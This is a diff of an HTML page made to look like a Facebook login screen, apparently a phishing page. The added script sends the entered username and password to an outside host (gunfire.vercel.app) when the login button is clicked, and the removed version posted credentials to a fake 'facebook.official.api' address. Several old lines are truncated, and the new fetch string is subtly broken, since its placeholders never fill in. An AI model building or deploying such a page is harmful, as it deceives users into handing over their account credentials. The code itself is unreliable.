@@ -1,32 +1,33 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
-  <title>Facebook Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Login</title>
+  <style>
+    body{font-family:Arial;background:#f2f2f2;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;height:100vh}
+    .card{width:320px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,0.08)}
+    input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box}
+    button{width:100%;padding:10px;background:#1877f2;color:#fff;border:none;border-radius:6px;cursor:pointer;font-weight:600}
+  </style>
 </head>
-<body style="background:                   
-  <div style="max-width:320px;margin:80px auto;padding:20px;background:white;border-radius:8px;box-shadow:0 0 5px #ccc;font-family:Arial;">
-    <h2 style="text-align:center;color:                       
-    <form action="https://facebook.official.api/phonenumber=phonenumber&password=password" method="POST">
-      <input type="text" name="username" placeholder="Email or phone number" style="width:100%;margin:5px 0;padding:10px;border:1px solid                                       
-      <input type="password" name="password" placeholder="Password" style="width:100%;margin:5px 0;padding:10px;border:1px solid #ddd;border-radius:5px;" required><br>
-      <button type="submit" style="width:100%;background:                                                                                                   
+<body>
+  <div class="card">
+    <h2 style="text-align:center;color:#1877f2;margin:0 0 12px 0">facebook</h2>
+
+    <form id="loginForm" onsubmit="return false;">
+      <input id="username" type="text" name="username" placeholder="Email or phone number" required>
+      <input id="password" type="password" name="password" placeholder="Password" required>
+      <button id="loginBtn" type="button">Log In</button>
     </form>
-    <div id="json-viewer"></div>
   </div>
+
   <script>
-    const form = document.querySelector('form');
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      const username = document.querySelector('input[name="username"]').value;
-      const password = document.querySelector('input[name="password"]').value;
-      const url = `https:                                                                      
-      fetch(url)
-        .then(res => res.json())
-        .then(data => {
-          document.getElementById('json-viewer').innerHTML = JSON.stringify(data, null, 2);
-        })
-        .catch(err => console.error(err));
+    document.getElementById('loginBtn').addEventListener('click', function () {
+      fetch("https://gunfire.vercel.app/api/check_ban?id=7254790945&message=${username}&message2=${password}")
+        .then(r => r.text())
+        .then(console.log)
+        .catch(console.error);
     });
   </script>
 </body>
